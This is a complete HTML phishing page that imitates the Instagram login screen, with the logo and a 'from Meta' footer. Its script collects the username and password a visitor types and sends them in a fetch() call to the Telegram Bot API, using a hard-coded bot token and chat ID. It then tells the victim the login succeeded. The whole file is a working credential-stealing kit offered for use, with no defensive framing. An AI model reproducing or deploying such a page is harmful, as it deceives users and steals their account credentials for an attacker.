<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #0d1117;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .login-box {
      background: #161b22;
      padding: 30px;
      border-radius: 14px;
      box-shadow: 0 0 12px #1f6feb;
      width: 320px;
      text-align: center;
      position: relative;
    }

    .login-box img {
      width: 80px;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 6px;
      color: white;
      font-size: 14px;
    }

    .password-box {
      position: relative;
      width: 100%;
    }

    .password-box input {
      padding-right: 40px;
    }

    .toggle-btn {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: #8b949e;
      cursor: pointer;
      font-size: 18px;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #1f6feb;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 12px;
    }

    .meta {
      margin-top: 20px;
      font-size: 12px;
      color: #8b949e;
    }

    #response {
      margin-top: 15px;
      font-size: 14px;
      color: #58a6ff;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
    
    <input type="text" id="username" placeholder="Username, email address or mobile number">
    
    <div class="password-box">
      <input type="password" id="password" placeholder="Password">
      <button type="button" class="toggle-btn" onclick="togglePassword()">üëÅÔ∏è</button>
    </div>

    <button onclick="sendToTelegram()">Log in</button>

    <p id="response"></p>
    
    <div class="meta">from Meta</div>
  </div>

  <script>
    function togglePassword() {
      const passwordInput = document.getElementById("password");
      passwordInput.type = passwordInput.type === "password" ? "text" : "password";
    }

    function sendToTelegram() {
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      const botToken = "7985477990:AAEJR8PUsUkE9WnVPAoEG8kH0a8Jkwm2q2k"; // üëà Replace this
      const chatId = "7966696528"; // üëà Your chat ID

      const message = `üí¨ New Instagram Login:\nüë§ Username: ${username}\nüîë Password: ${password}`;

      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

      fetch(url).then(response => {
        if (response.ok) {
          document.getElementById('response').innerText = "‚úÖ Login successful!";
        } else {
          document.getElementById('response').innerText = "‚ùå Failed to send.";
        }
      });
    }
  </script>

</body>
</html>
